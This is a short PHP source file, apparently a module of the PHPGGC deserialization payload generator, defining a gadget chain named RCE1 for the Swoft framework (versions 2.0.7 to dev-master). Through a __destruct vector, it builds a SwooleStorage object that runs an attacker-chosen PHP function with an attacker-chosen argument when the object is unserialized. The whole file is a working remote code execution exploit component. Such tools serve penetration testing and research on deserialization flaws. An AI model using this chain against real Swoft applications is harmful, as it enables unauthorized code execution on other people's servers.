<?php

namespace GadgetChain\Swoft;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '2.0.7 <= dev-master';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Swoft\Session\SwooleStorage($function, $parameter);
    }
}